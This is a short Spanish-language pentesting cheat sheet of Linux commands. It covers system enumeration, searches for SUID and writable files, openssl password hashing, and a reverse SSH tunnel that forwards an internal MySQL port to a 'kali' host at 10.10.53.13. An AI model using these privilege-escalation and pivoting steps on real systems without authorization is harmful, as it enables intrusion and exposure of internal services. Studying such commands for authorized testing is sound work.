
# Linux

En esta entrada describimos comandos en **Linux** utilizados en pentesting.

## Ver información del sistema

```bash
uname -a
```
```bash
lsb_release -a
```

## Buscar ficheros SUID

```bash
cd /
```

```bash
find \-perm -4000 2>/dev/null
```

## Buscar ficheros con permisos de escritura

```bash
cd /
```

```bash
find \-writable 2>/dev/null | grep "etc"
```

## Generar contraseña UNIX

```bash
openssl passwd
```

## SSH conexión reversa

Podemos crear conexión reversa a un puerto interno.

Los páremetros fNT es para que la conexión sea en segundo plano.

```bash
ssh -R 4343:127.0.0.1:3306 kali@10.10.53.13 -fNT
```
